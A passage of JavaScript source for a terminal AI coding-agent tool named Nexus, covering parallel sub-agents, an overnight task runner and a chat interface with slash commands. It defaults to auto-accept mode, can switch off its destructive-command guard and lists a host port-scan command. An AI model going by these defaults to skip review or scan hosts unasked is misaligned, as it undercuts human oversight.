  const fs = require("fs"), path = require("path");
  const arr = (Array.isArray(argv) ? argv.slice() : [String(argv || "")]);
  let engine = ""; const tasks = [];
  for (let i = 0; i < arr.length; i++) { if (arr[i] === "-e" || arr[i] === "--engine") engine = arr[++i] || ""; else tasks.push(arr[i]); }
  const cwd = process.cwd();
  if (!tasks.length) { banner(); console.log("  " + bold("Nexus agents") + " — run independent tasks in parallel\n\n  " + gray("usage: ") + cyan("sentinel nexus agents \"add tests\" \"write docs\" \"fix lint\"") + gray("  [-e claude|ollama|opencode]") + "\n"); return; }
  let cfg = {}; try { cfg = JSON.parse(fs.readFileSync(path.join(cwd, ".nexus", "config.json"), "utf8")); } catch (_) {}
  engine = engine || cfg.engine || (hasBin("claude") ? "claude" : "ollama");
  let model = cfg.model || process.env.SENTINEL_MODEL || "";
  if (engine === "ollama" && !model) { const ms = await ollamaTags(); model = pickCoderModel(ms); }
  banner(); console.log("  " + bold(tasks.length + " agents") + gray("  ·  engine " + engine + (model ? " (" + model + ")" : "")) + "\n");
  tasks.forEach((t, i) => console.log("  " + cyan("agent " + (i + 1)) + gray("  " + t)));
  console.log("");
  const outs = await runSubagents(engine, tasks, cwd, model, (i, phase) => { if (phase === "run") console.log("  " + yellow("> agent " + (i + 1) + " started")); else console.log("  " + green("● agent " + (i + 1) + " done")); });
  console.log("");
  outs.forEach((o, i) => { console.log("  " + bold(cyan("── agent " + (i + 1) + " ── ")) + gray(tasks[i])); console.log(gray("  " + String(o || "(no output)").replace(/\n/g, "\n  ")) + "\n"); });
}
async function nexusRun(argv) {
  const fs = require("fs"), path = require("path");
  const arr = Array.isArray(argv) ? argv.slice() : String(argv || "").split(/\s+/).filter(Boolean);
  let enginePref = "", overnight = false, resume = false, until = "", modelOverride = "", goalParts = [];
  for (let i = 0; i < arr.length; i++) { const a = arr[i];
    if (a === "--engine" || a === "-e") enginePref = arr[++i] || "";
    else if (a === "--overnight" || a === "-n") overnight = true;
    else if (a === "--resume") resume = true;
    else if (a === "--until") until = arr[++i] || "";
    else if (a === "-m" || a === "--model") modelOverride = arr[++i] || "";
    else if (a === "-h" || a === "--help") return nexusRunHelp();
    else goalParts.push(a);
  }
  const cwd = process.cwd(), NEXUS = path.join(cwd, ".nexus"); fs.mkdirSync(NEXUS, { recursive: true });
  const stateFile = path.join(NEXUS, "run.json"), reportFile = path.join(NEXUS, "report.md"), memFile = path.join(NEXUS, "memory.md");
  const memory = (() => { try { return fs.readFileSync(memFile, "utf8"); } catch (_) { return ""; } })();
  const avail = { claude: hasBin("claude"), opencode: hasBin("opencode"), ollama: true };
  let engine = enginePref || (avail.claude ? "claude" : "ollama");
  if (engine !== "hybrid" && !avail[engine]) { console.log("  " + red("engine '" + engine + "' unavailable; using ollama")); engine = "ollama"; }
  if (engine === "hybrid" && !avail.claude) { console.log("  " + red("hybrid needs Claude Code installed; using ollama")); engine = "ollama"; }
  let model = null;
  if (engine === "ollama" || engine === "hybrid") {
    const ms = await ollamaTags();
    if (!ms.length) { if (engine === "hybrid") { console.log("  " + gray("no local model; hybrid falling back to Claude only")); engine = "claude"; } else { console.log("  " + red("no local model; install Ollama or use --engine claude")); return; } }
    else model = modelOverride || process.env.SENTINEL_MODEL || pickCoderModel(ms);
  }
  let state;
  if (resume && fs.existsSync(stateFile)) { state = JSON.parse(fs.readFileSync(stateFile, "utf8")); banner(); h1("Nexus — resuming run"); }
  else {
    const goal = goalParts.join(" ").trim();
    if (!goal) { console.log("  " + red("provide a goal:  sentinel nexus run \"build X\"")); return; }
    banner(); h1("Nexus — planning");
    console.log("  " + gray("engine ") + mag(engine) + (model ? gray("  model " + model) : "") + gray("  workdir " + cwd));
    console.log("  " + gray("decomposing the goal...\n"));
    const tasks = await planGoal(engine === "hybrid" ? "claude" : engine, model, goal, memory);
    state = { goal, engine, model, tasks, started: Date.now() };
    console.log("  " + bold("Plan (" + tasks.length + " tasks):"));
    tasks.forEach((t) => console.log("    " + gray(t.id + ". ") + t.title));
    console.log("");
    fs.writeFileSync(stateFile, JSON.stringify(state, null, 2));
  }
  const save = () => { try { fs.writeFileSync(stateFile, JSON.stringify(state, null, 2)); } catch (_) {} };
  const deadline = until ? parseUntil(until) : 0, maxTries = overnight ? 3 : 1;
  while (true) {
    const t = state.tasks.find((x) => !x.done && !x.failed);
    if (!t) break;
    if (deadline && Date.now() > deadline) { console.log("  " + gray("time limit reached; pausing. Resume with:  sentinel nexus run --resume")); break; }
    console.log("  " + cyan("[" + t.id + "/" + state.tasks.length + "] ") + bold(t.title)); t.tries++;
    const ctx = "GOAL: " + state.goal + "\nDone so far: " + (state.tasks.filter((x) => x.done).map((x) => x.title).join("; ") || "(none)") + (memory ? "\nPROJECT MEMORY:\n" + memory : "");
    const taskPrompt = "Work in the current project directory. " + ctx + "\n\nComplete ONLY this task, then briefly report what you did:\nTASK: " + t.title;
    let res, usedEngine = engine;
    if (engine === "ollama") { res = await ollamaExec(model, t.title, ctx, cwd); usedEngine = "ollama"; }
    else if (engine === "hybrid") {
      // Cost-saver: do the work on the free local model first; only spend Claude if it can't finish.
      console.log("    " + gray("local model first…"));
      res = await ollamaExec(model, t.title, ctx, cwd); usedEngine = "ollama";
      const v = await verifyTask("ollama", model, state.goal, t.title, res);
      if (!v.done) { console.log("    " + gray("escalating to claude…")); res = await runEngineTask("claude", taskPrompt, cwd, true); usedEngine = "claude"; }
    }
    else { res = await runEngineTask(engine, taskPrompt, cwd, true); usedEngine = engine; }
    const verdict = await verifyTask(usedEngine, model, state.goal, t.title, res);
    if (verdict.done) { t.done = true; t.by = usedEngine; console.log("  " + green("done ") + gray(t.title) + gray("  [" + usedEngine + "]")); }
    else if (t.tries >= maxTries) { t.failed = true; console.log("  " + red("gave up ") + gray(t.title + " — " + verdict.reason)); }
    else console.log("  " + gray("not verified (" + verdict.reason + "); retrying"));
    save();
  }
  const okN = state.tasks.filter((t) => t.done).length, failN = state.tasks.filter((t) => t.failed).length;
  try { fs.writeFileSync(reportFile, "# Nexus run report\n\n- Goal: " + state.goal + "\n- Engine: " + engine + "\n- Completed: " + okN + "/" + state.tasks.length + (failN ? " (" + failN + " failed)" : "") + "\n\n## Tasks\n" + state.tasks.map((t) => "- [" + (t.done ? "x" : " ") + "] " + t.title + (t.failed ? "  (failed)" : "")).join("\n") + "\n"); } catch (_) {}
  const localN = state.tasks.filter((t) => t.by === "ollama").length, claudeN = state.tasks.filter((t) => t.by === "claude").length;
  console.log("\n  " + green("run complete: ") + okN + "/" + state.tasks.length + " tasks done" + (failN ? gray(", " + failN + " failed") : ""));
  if (engine === "hybrid") console.log("  " + gray("engine mix: ") + localN + gray(" done locally (free) · ") + claudeN + gray(" needed Claude — that's ") + Math.round(100 * localN / Math.max(1, localN + claudeN)) + gray("% off your Claude usage"));
  console.log("  " + gray("report: .nexus/report.md") + "\n");
}

// Full-screen chat TUI (alt-screen, scrolling transcript, fixed bottom input box). No deps.
// Whimsical status verbs — Claude Code's set PLUS Nexus-originals (marked below).
const FORGE = ["Accomplishing", "Actioning", "Actualizing", "Baking", "Booping", "Brewing", "Calculating", "Cerebrating", "Channelling", "Churning", "Clauding", "Coalescing", "Cogitating", "Combobulating", "Computing", "Concocting", "Conjuring", "Considering", "Cooking", "Crafting", "Creating", "Crunching", "Deliberating", "Determining", "Discombobulating", "Divining", "Doing", "Effecting", "Elucidating", "Enchanting", "Envisioning", "Finagling", "Flibbertigibbeting", "Forging", "Forming", "Frolicking", "Generating", "Germinating", "Hatching", "Herding", "Honking", "Hustling", "Ideating", "Imagining", "Incubating", "Inferring", "Jiving", "Kneading", "Manifesting", "Marinating", "Meandering", "Moseying", "Mulling", "Mustering", "Musing", "Noodling", "Percolating", "Perusing", "Philosophising", "Pondering", "Pontificating", "Processing", "Puttering", "Puzzling", "Reticulating", "Ruminating", "Scheming", "Schlepping", "Shimmying", "Shucking", "Simmering", "Smooshing", "Spelunking", "Spinning", "Stewing", "Sussing", "Synthesizing", "Thinking", "Tinkering", "Transmuting", "Unfurling", "Vibing", "Wandering", "Whirring", "Wibbling", "Wizarding", "Working", "Wrangling",
  // Nexus-original verbs (built from scratch):
  "Nexusing", "Nebulizing", "Weaving", "Orchestrating", "Constellating", "Tessellating", "Kindling", "Untangling", "Refracting", "Distilling", "Alchemizing", "Threading", "Warping", "Grokking", "Percussing", "Lucubrating", "Quantizing", "Foraging", "Splicing", "Braiding", "Zhuzhing", "Effervescing", "Crystallizing", "Cascading"];
// Feature tips shown while a turn is running. NEXUS_TIPS are engine-agnostic (Nexus's own
// features); ENGINE_TIPS list ONLY what that specific AI actually offers — never mixed.
const NEXUS_TIPS = [
  "/undo reverts the last turn's file changes — a checkpoint is taken before each turn",
  "drop a file into your message with @path (e.g. fix @src/app.js)",
  "!cmd runs a shell command inline · #note saves a memory to .nexus/NEXUS.md",
  "scroll back with the mouse wheel or PgUp/PgDn · End jumps to the latest",
  "shift+tab cycles mode · ctrl+o expands tool detail · ctrl+c stops a turn",
  "/budget 5 caps your spend · /compact shrinks the context when it fills up",
  "type / to see every command · /engine switches which AI runs",
];
const ENGINE_TIPS = {
  claude: [
    "Claude can search the web, run bash, read/write files and spawn sub-agents to parallelize",
    "your real token usage and dollar cost update live in the status bar",
    "plan mode (shift+tab) has Claude outline the work before it touches any files",
    "Claude reads .nexus/NEXUS.md every session — keep project context there",
  ],
  ollama: [
    "this AI runs 100% on your machine — private, offline-capable, and free",
    "no token charges here — the meter shows estimated local tokens only",
    "switch local models anytime with /model (e.g. qwen2.5-coder, hermes3)",
    "local models have no external rate limits — run as long as you like",
    "it has full local tool access: read, write, edit files and run commands",
  ],
  opencode: [
    "OpenCode drives whichever provider/model you've configured for it",
    "prefer Claude or a private local model? switch with /engine",
  ],
};
function nexusTui(engine, cwd, nexusMd) {
  return new Promise((resolve) => {
    const out = process.stdout, ESC = "\x1b";
    const cols = () => out.columns || 80, rows = () => out.rows || 24;
    const PAID = { claude: true, opencode: true, ollama: false };
    const CTXW = { claude: 200000, opencode: 200000, ollama: 8192 };
    const transcript = [{ role: "art" }, { role: "system", text: "AI coding agent  ·  " + engine + "  ·  " + cwd + "\ntype a message  ·  / for commands  ·  @file inline  ·  !cmd shell  ·  #note memory" }];
    const sess = { model: engine, ctxWindow: CTXW[engine] || 200000, ctxUsed: 0, inTok: 0, outTok: 0, cost: 0, liveOut: 0 };
    const oMsgs = nexusMd ? [{ role: "system", content: "You are Nexus, a concise expert coding assistant.\n" + nexusMd }] : [{ role: "system", content: "You are Nexus, a concise expert coding assistant." }];
    let input = "", busy = false, cont = false, busyStart = 0, busyWord = "", tick = null;
    let expanded = false, mode = 1, runningShells = 0, activeAgents = 0, scroll = 0; // mode: 0 normal, 1 auto-accept, 2 plan; scroll = lines up from bottom
    const MODES = [{ k: "normal", c: gray }, { k: "auto-accept", c: green }, { k: "plan", c: cyan }];
    const compact = { on: false, f: 0, iv: null };
    const history = []; let hIdx = -1;
    let ctl = null, costCap = 0, rate = null, warned50 = false, pasteBuf = null, notify = false, redact = false, offline = false, guard = "enforce"; // …, guard: enforce|warn|off
    const impact = { localTurns: 0, cloudTurns: 0, localTok: 0, cloudInTok: 0, cloudOutTok: 0, cloudCost: 0, ctxSavedTok: 0, coworkSaved: 0, delegated: 0 }; // Impact Receipt tallies
    let cowork = { on: false, strong: "", weak: "" }; // two-model cost-saver: strong codes, weak does cheap/mechanical work
    // model to use for an auxiliary claude call (commit/review/plan/dream): the weak model when cowork is on
    const auxModel = () => (cowork.on && engine === "claude") ? cowork.weak : undefined;
    const checkpoints = [], redoStack = [], pinned = new Set();       // { tree, label, ts }; pinned = sticky context files
    // interrupt controller: .stopped is polled by loops; .kids are killers (child procs / aborts) fired on ctrl+c
    const makeCtl = () => ({ stopped: false, kids: [], kill() { this.stopped = true; for (const k of this.kids.splice(0)) { try { k(); } catch (_) {} } } });
    const aSignal = (c) => { const ac = new AbortController(); if (c && c.kids) c.kids.push(() => { try { ac.abort(); } catch (_) {} }); return ac.signal; };
    const fs = require("fs"), path = require("path");
    // @path inlines a file's contents into the prompt sent to the engine (display keeps the @mention)
    const inlineAts = (t) => t.replace(/(^|\s)@(\S+)/g, (m, pre, f) => { try { const c = fs.readFileSync(path.resolve(cwd, f), "utf8"); return pre + "\n\n--- " + f + " ---\n" + c.slice(0, 12000) + "\n--- end " + f + " ---\n"; } catch (_) { return m; } });
    // !cmd runs a shell command directly (Claude-Code-style passthrough); output shown inline
    const runBang = (c) => { const dg = classifyDanger(c); if (dg.level !== "ok" && guard !== "off") transcript.push({ role: "system", text: "Sentinel: this looks destructive (" + dg.why + ") — running it because you typed it directly" }); const blk = { role: "system", text: "$ " + c + "\nrunning…" }; transcript.push(blk); busy = true; ctl = makeCtl(); scroll = 0; render(); coderShell(c, cwd).then((r) => { const o = (r.output || "").replace(/[ \t\r\n]+$/, ""); blk.text = "$ " + c + "\n" + (o || "(no output)") + (r.code ? "\n[exit " + r.code + "]" : ""); busy = false; ctl = null; render(); }); };
    // #note appends a durable memory to .nexus/NEXUS.md
    const addMemory = (line) => { try { const dir = path.join(cwd, ".nexus"); fs.mkdirSync(dir, { recursive: true }); const md = path.join(dir, "NEXUS.md"); let c = ""; try { c = fs.readFileSync(md, "utf8"); } catch (_) {} if (!/\n##\s*Notes/.test(c)) c += (c && !c.endsWith("\n") ? "\n" : "") + "\n## Notes\n"; c += "- " + line + "\n"; fs.writeFileSync(md, c); transcript.push({ role: "system", text: "remembered → .nexus/NEXUS.md: " + line }); } catch (e) { transcript.push({ role: "system", text: "could not save note: " + e.message }); } };
    // ---- ansi-aware width helpers ----
    const stripA = (s) => String(s).replace(/\x1b\[[0-9;]*m/g, "");
    const clip = (s, n) => { let o = "", v = 0; for (const part of String(s).split(/(\x1b\[[0-9;]*m)/)) { if (/^\x1b/.test(part)) { o += part; continue; } for (const ch of part) { if (v >= n) return o; o += ch; v++; } } return o; };
    const fmtK = (n) => n >= 100000 ? (n / 1000).toFixed(0) + "k" : n >= 1000 ? (n / 1000).toFixed(1) + "k" : "" + (n | 0);
    const base = (pth) => String(pth || "").split("/").pop() || String(pth || "");
    const oneline = (s, n) => { s = String(s || "").replace(/\s+/g, " ").trim(); return s.length > (n || 44) ? s.slice(0, (n || 44) - 1) + "…" : s; };
    // ---- NEXUS logo (gradient) + slash-command menu ----
    const THEMES = { aurora: ["38;5;51", "38;5;45", "38;5;81", "38;5;75", "38;5;135", "38;5;171"], matrix: ["38;5;46", "38;5;40", "38;5;34", "38;5;28", "38;5;40", "38;5;46"], sunset: ["38;5;226", "38;5;220", "38;5;214", "38;5;208", "38;5;202", "38;5;196"], ocean: ["38;5;45", "38;5;39", "38;5;38", "38;5;44", "38;5;33", "38;5;27"], violet: ["38;5;141", "38;5;135", "38;5;99", "38;5;105", "38;5;171", "38;5;177"], mono: ["38;5;252", "38;5;248", "38;5;245", "38;5;242", "38;5;240", "38;5;238"] };
    let GRAD = THEMES.aurora;
    const gline = (s, i) => useColor ? "\x1b[1;" + GRAD[i % GRAD.length] + "m" + s + "\x1b[0m" : s;
    const ART = [
      "  ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗",
      "  ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝",
      "  ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗",
      "  ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║",
      "  ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║",
      "  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝",
    ];
    const CMDS = [
      ["/help", "commands, input prefixes & keys"], ["/clear", "start a fresh chat"], ["/compact", "summarize & shrink the context"],
      ["/context", "show token / context usage"], ["/cost", "session token cost so far"], ["/budget", "set a spend cap in USD"],
      ["/undo", "revert the last turn's file changes"], ["/rewind", "restore a specific checkpoint (/rewind N)"], ["/checkpoints", "list undo checkpoints"],
      ["/resume", "reload the last saved session"], ["/export", "save the conversation to a markdown file"], ["/copy", "copy the last reply to the clipboard"],
      ["/status", "session engine, model, tokens & cost"], ["/doctor", "check engines & tools are available"], ["/init", "scaffold .nexus/ in this project"],
      ["/model", "show or set the model"], ["/engine", "switch claude | opencode | ollama"], ["/commands", "list custom project commands"],
      ["/agents", "run tasks in parallel: /agents a ;; b ;; c"], ["/mcp", "list / connect MCP servers"], ["/hooks", "show configured tool hooks"],
      ["/race", "run a prompt on every engine at once"], ["/review", "second opinion from a different engine"], ["/redo", "reapply an undone change"],
      ["/secrets", "scan the repo for leaked credentials"], ["/scan", "quick TCP port scan of a host"], ["/notify", "bell + desktop alert on long turns"],
      ["/watch", "run a cmd; auto-fix & re-run until it passes"], ["/commit", "AI commit message + commit the diff"], ["/diff", "colored session diff vs HEAD"],
      ["/pin", "keep a file in context every turn"], ["/pins", "list pinned files"], ["/unpin", "remove a pinned file"], ["/redact", "mask secrets before cloud sends"],
      ["/ensemble", "all engines answer, then synthesize the best"], ["/bench", "speed / tokens / cost table per engine"], ["/explain", "explain the diff or a file in plain English"], ["/test", "generate & run unit tests for a file"],
      ["/index", "index the repo for local auto-context"], ["/snippet", "save / use a prompt macro"], ["/snippets", "list saved prompt macros"],
      ["/plan", "make & run an editable task checklist"], ["/git", "branch, status & recent commits"], ["/blame", "who last changed a file's lines"],
      ["/cowork", "strong model codes, weak model does cheap work"], ["/guard", "preflight destructive commands (enforce|warn|off)"], ["/impact", "session savings (tokens & cost avoided)"], ["/gaps", "list TODO/FIXME markers · /gaps plan"], ["/dream", "consolidate the session into NEXUS.md memory"],
      ["/tree", "show the project file tree"], ["/theme", "change the color theme"], ["/offline", "local-only privacy lock"],
      ["/expand", "toggle tool-call detail"], ["/exit", "quit Nexus"],
    ];
    // Custom project slash commands (Claude-Code / Glitch style): each .md file in
    // .nexus/commands/ or .claude/commands/ becomes /<name>; its body is the prompt,
    // with $ARGUMENTS / $1 $2… substituted from what you type after the command.
    const customCmds = {};
    for (const dir of [path.join(cwd, ".nexus", "commands"), path.join(cwd, ".claude", "commands")]) {
      try { for (const f of fs.readdirSync(dir)) { if (!/\.md$/.test(f)) continue; const nm = "/" + f.replace(/\.md$/, ""); if (customCmds[nm]) continue; const body = fs.readFileSync(path.join(dir, f), "utf8"); const desc = ((body.split("\n").find((l) => l.trim()) || "custom command").replace(/^#+\s*/, "") + " (custom)").slice(0, 52); customCmds[nm] = { body, desc }; } } catch (_) {}
    }
    const allCmds = () => CMDS.concat(Object.keys(customCmds).map((k) => [k, customCmds[k].desc]));
    // ---- MCP servers + hooks (loaded from .nexus/) ----
    const hooks = loadHooks(cwd);
    let mcpServers = []; // connected { name, call, tools } (or { name, error })
    const mcpToolList = () => mcpServers.filter((s) => !s.error).flatMap((s) => (s.tools || []).map((t) => ({ full: "mcp__" + s.name + "__" + t.name, srv: s, name: t.name, desc: t.description || "" })));
    // saved prompt macros (.nexus/snippets.json) + a lightweight local codebase index (.nexus/index.json)
    let snippets = {}; try { snippets = JSON.parse(fs.readFileSync(path.join(cwd, ".nexus", "snippets.json"), "utf8")) || {}; } catch (_) {}
    const saveSnippets = () => { try { fs.mkdirSync(path.join(cwd, ".nexus"), { recursive: true }); fs.writeFileSync(path.join(cwd, ".nexus", "snippets.json"), JSON.stringify(snippets, null, 2)); } catch (_) {} };
    let plan = []; try { const pj = JSON.parse(fs.readFileSync(path.join(cwd, ".nexus", "plan.json"), "utf8")); if (Array.isArray(pj)) plan = pj; } catch (_) {}
    const savePlan = () => { try { fs.mkdirSync(path.join(cwd, ".nexus"), { recursive: true }); fs.writeFileSync(path.join(cwd, ".nexus", "plan.json"), JSON.stringify(plan, null, 2)); } catch (_) {} };
    let index = null; try { const raw = JSON.parse(fs.readFileSync(path.join(cwd, ".nexus", "index.json"), "utf8")); if (raw && raw.files) index = raw; } catch (_) {}
    const buildIndex = () => {
      const files = {}; const SKIP = /(^|\/)(\.git|node_modules|\.nexus|dist|build|\.cache|\.next|target|__pycache__)(\/|$)/;
      const CODE = /\.(js|jsx|ts|tsx|py|rb|go|rs|java|c|h|cpp|cc|cs|php|swift|kt|sh|css|scss|html|json|md|yml|yaml|toml)$/i;
      const walk = (d) => { let ents; try { ents = fs.readdirSync(d, { withFileTypes: true }); } catch (_) { return; } for (const e of ents) { const fp = path.join(d, e.name); if (SKIP.test(fp)) continue; if (e.isDirectory()) walk(fp); else if (CODE.test(e.name)) { try { if (fs.statSync(fp).size > 400000) continue; const txt = fs.readFileSync(fp, "utf8"); const kw = {}; for (const w of txt.toLowerCase().match(/[a-z_][a-z0-9_]{2,}/g) || []) kw[w] = (kw[w] || 0) + 1; files[path.relative(cwd, fp)] = Object.keys(kw); } catch (_) {} } if (Object.keys(files).length > 4000) return; } };
      walk(cwd); index = { files, ts: Date.now() }; try { fs.mkdirSync(path.join(cwd, ".nexus"), { recursive: true }); fs.writeFileSync(path.join(cwd, ".nexus", "index.json"), JSON.stringify(index)); } catch (_) {} return Object.keys(files).length;
    };
    // score indexed files by keyword overlap with the prompt; return the top matches (excluding pinned/@-mentioned)
    const retrieve = (text, k) => { if (!index || !index.files) return []; const q = new Set((text.toLowerCase().match(/[a-z_][a-z0-9_]{2,}/g) || []).filter((w) => w.length > 3)); if (!q.size) return []; const scored = []; for (const f of Object.keys(index.files)) { if (pinned.has(f) || text.includes("@" + f)) continue; let s = 0; for (const w of index.files[f]) if (q.has(w)) s++; if (s > 1) scored.push([f, s]); } scored.sort((a, b) => b[1] - a[1]); return scored.slice(0, k || 3).map((x) => x[0]); };
    // ---- inline markdown / command coloring ----
    const paintCode = (c) => (/(^|\s)(node|npm|npx|git|python3?|pip3?|bash|sh|cd|ls|cat|make|cargo|go|docker|curl|grep|sed|rm|mkdir|chmod|sudo)\b/.test(c) || /\s--?\w/.test(c)) ? blue(c) : mag(c);
    const colorMd = (line, inCode) => { if (inCode) return blue(line); if (/^#{1,6}\s/.test(line)) return bold(cyan(line)); let s = line.replace(/`([^`]+)`/g, (_, c) => paintCode(c)).replace(/\*\*([^*]+)\*\*/g, (_, c) => bold(c)); return s.replace(/^(\s*[-*]\s)/, (_, b) => cyan(b)); };
    const wrap = (text) => { const width = Math.max(1, cols() - 4); const res = []; for (const para of String(text).replace(/\r/g, "").split("\n")) { let s = para; if (!s.length) { res.push(""); continue; } while (s.length > width) { let w = width; const cc = s.charCodeAt(w - 1); if (cc >= 0xD800 && cc <= 0xDBFF) w = Math.max(1, w - 1); res.push(s.slice(0, w)); s = s.slice(w); } res.push(s); } return res; };
    // ---- tool-card labels (Claude-Code style) ----
    const toolLabel = (name, a) => {
      a = a || {};
      if (name === "Write") return "Write(" + base(a.file_path) + ")";
      if (name === "Edit" || name === "MultiEdit") return "Update(" + base(a.file_path) + ")";
      if (name === "NotebookEdit") return "Notebook(" + base(a.notebook_path) + ")";
      if (name === "Read") return "Read(" + base(a.file_path) + ")";
      if (name === "Bash") return "Bash(" + oneline(a.command, 40) + ")" + (a.run_in_background ? gray(" &") : "");
      if (name === "Grep") return "Grep(" + oneline(a.pattern, 30) + ")";
      if (name === "Glob") return "Glob(" + oneline(a.pattern, 30) + ")";
      if (name === "Task") return "Task(" + oneline(a.subagent_type || a.description || "agent", 30) + ")";
      if (name === "WebFetch") return "Fetch(" + oneline(a.url, 36) + ")";
      if (name === "WebSearch") return "Search(" + oneline(a.query, 34) + ")";
      if (name === "TodoWrite" || name === "TaskCreate" || name === "TaskUpdate") return "Plan(update)";
      if (String(name).startsWith("mcp__")) return String(name).replace(/^mcp__/, "").replace(/__/, ":") + "()";
      const v = Object.values(a)[0]; return name + "(" + (v != null ? oneline(String(v), 34) : "") + ")";
    };
    const resultText = (c) => { if (c == null) return ""; if (typeof c === "string") return c; if (Array.isArray(c)) return c.map((x) => (x && x.text) || (typeof x === "string" ? x : "")).join(" "); return String(c); };
    // ---- transcript block accessors ----
    const cur = () => transcript[transcript.length - 1];
    const ensureText = () => { const b = cur(); if (!b.items) b.items = []; let last = b.items[b.items.length - 1]; if (!last || last.type !== "text") { last = { type: "text", full: "", shown: 0 }; b.items.push(last); } return last; };
    // ---- render body ----
    const spin = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"];
    const bodyLines = () => {
      const L = [];
      for (const m of transcript) {
        if (m.role === "art") { L.push(""); ART.forEach((ln, i) => L.push(gline(ln, i))); L.push(""); continue; }
        if (m.role === "diff") { for (const ln of String(m.text).replace(/\r/g, "").split("\n")) { const c = /^\+\+\+|^---/.test(ln) ? bold : /^\+/.test(ln) ? green : /^-/.test(ln) ? red : /^@@/.test(ln) ? cyan : gray; L.push(c(clip(ln, cols() - 3))); } L.push(""); continue; }
        if (m.role === "plan") { const done = plan.filter((t) => t.done).length; L.push(bold(cyan("plan")) + gray("  " + done + "/" + plan.length + " done  ·  /plan run to execute")); if (!plan.length) L.push("  " + gray("(empty)")); for (let i = 0; i < plan.length; i++) { const t = plan[i]; const box = t.running ? yellow("[~]") : t.done ? green("[x]") : gray("[ ]"); for (const ln of wrap((i + 1) + ". " + t.text)) L.push("  " + box + " " + colorMd(ln, false)); } L.push(""); continue; }
        if (m.role === "system") { for (const ln of wrap(m.text)) L.push(gray(ln)); L.push(""); continue; }
        if (m.role === "user") { const w = wrap(m.text); L.push(mag("› ") + (w[0] || "")); for (let i = 1; i < w.length; i++) L.push("  " + w[i]); L.push(""); continue; }
        // nexus turn: ordered items (text + tool cards)
        L.push(cyan("● ") + bold("nexus") + gray("  " + engine));
        for (const it of (m.items || [])) {
          if (it.type === "text") {
            const vis = it.full.slice(0, it.shown);
            let inCode = false;
            for (const ln of wrap(vis)) { if (/^```/.test(ln.trim())) { inCode = !inCode; L.push("  " + gray(ln)); continue; } L.push("  " + colorMd(ln, inCode)); }
          } else if (it.type === "thinking") {
            L.push("  " + dim(gray("● thinking" + (expanded ? ":" : " (ctrl+o to show)"))));
            if (expanded) for (const ln of wrap(it.full).slice(0, 24)) L.push("    " + dim(gray(ln)));
          } else if (it.type === "tool") {
            const dot = it.status === "run" ? yellow(spin[(Date.now() / 90 | 0) % spin.length]) : it.status === "err" ? red("●") : green("●");
            const secs = it.end ? ((it.end - it.start) / 1000).toFixed(1) + "s" : ((Date.now() - it.start) / 1000).toFixed(1) + "s";
            L.push("  " + dot + " " + bold(it.label) + gray("  " + secs));
            if (expanded && it.detail) for (const ln of wrap(stripA(it.detail)).slice(0, 6)) L.push("    " + gray("⎿ " + ln));
          }
        }
        // live status line while this turn is running
        if (busy && m === cur()) {
          const el = Math.round((Date.now() - busyStart) / 1000);
          const tok = sess.liveOut ? " · " + fmtK(sess.liveOut) + " tokens" : "";
          L.push("  " + mag(spin[(Date.now() / 90 | 0) % spin.length] + " " + busyWord + "…") + gray("  (" + el + "s" + tok + " · ctrl+c to stop)"));
          const et = ENGINE_TIPS[engine] || [], tips = [];
          for (let k = 0; k < Math.max(NEXUS_TIPS.length, et.length); k++) { if (et[k]) tips.push(et[k]); if (NEXUS_TIPS[k]) tips.push(NEXUS_TIPS[k]); } // interleave so an engine-specific tip shows first
          if (tips.length) L.push("  " + dim(gray("tip: " + tips[Math.floor(el / 4) % tips.length])));
        } else if (m.summary) {
          L.push("  " + dim(gray(m.summary)));
        }
        L.push("");
      }
      return L;
    };
    // ---- status + hint bars ----
    const statusBar = () => {
      const ctxW = sess.ctxWindow || 200000;
      const pct = Math.min(100, Math.round((sess.ctxUsed / ctxW) * 100));
      const cells = 8, fill = Math.max(0, Math.min(cells, Math.round((pct / 100) * cells)));
      const pc = pct >= 80 ? red : pct >= 50 ? yellow : cyan;
      const bar = pc("▓".repeat(fill)) + gray("░".repeat(cells - fill));
      const parts = [bold(sess.model || engine), gray("ctx ") + pc(pct + "%") + " " + bar, gray("↑") + fmtK(sess.inTok) + gray(" ↓") + fmtK(sess.outTok) + gray(" tok")];
      if (PAID[engine]) { const c = costCap && sess.cost >= costCap ? red : green; parts.push(sess.cost ? c("$" + sess.cost.toFixed(4)) + (costCap ? gray("/" + costCap.toFixed(2)) : "") : gray("subscription")); }
      else parts.push(green("local · free"));
      if (runningShells) parts.push(yellow(runningShells + " shell" + (runningShells > 1 ? "s" : "")));
      if (activeAgents) parts.push(mag(activeAgents + " agent" + (activeAgents > 1 ? "s" : "")));
      if (rate && rate.status && rate.status !== "allowed") parts.push(red("rate-limited"));
      else if (rate && rate.isUsingOverage) parts.push(yellow("overage"));
      if (pinned.size) parts.push(cyan(pinned.size + " pinned"));
      if (redact) parts.push(yellow("redact"));
      if (offline) parts.push(green("offline"));
      if (guard !== "enforce") parts.push((guard === "off" ? red : yellow)("guard:" + guard));
      if (cowork.on) parts.push(mag("cowork " + cowork.strong.replace(/^claude-|-\d.*$/g, "") + "→" + cowork.weak.replace(/^claude-|-\d.*$/g, "")));
      parts.push(MODES[mode].c(MODES[mode].k));
      return "  " + clip(parts.join(gray("  ·  ")), cols() - 3);
    };
    const hint = () => {
      const C = cols();
      if (compact.on) { const n = 22, f = Math.min(n, compact.f); return clip("  " + yellow("Compacting conversation… ") + gray("[") + cyan("▓".repeat(f)) + gray("░".repeat(n - f)) + gray("] ") + Math.round((f / n) * 100) + "%", C - 2); }
      if (scroll > 0) return clip("  " + yellow("↑ scrolled — " + scroll + " line" + (scroll > 1 ? "s" : "") + " below") + gray("  ·  ") + blue("PgUp/PgDn") + gray(" or wheel to scroll  ") + blue("End") + gray(" jump to latest"), C - 2);
      return clip("  " + blue("↵") + gray(" send  ") + blue("shift+tab") + gray(" mode  ") + blue("ctrl+o") + gray(" " + (expanded ? "collapse" : "expand")) + gray("  ") + blue("@") + gray("file ") + blue("!") + gray("sh ") + blue("#") + gray("note  ") + blue("/") + gray("cmds"), C - 2);
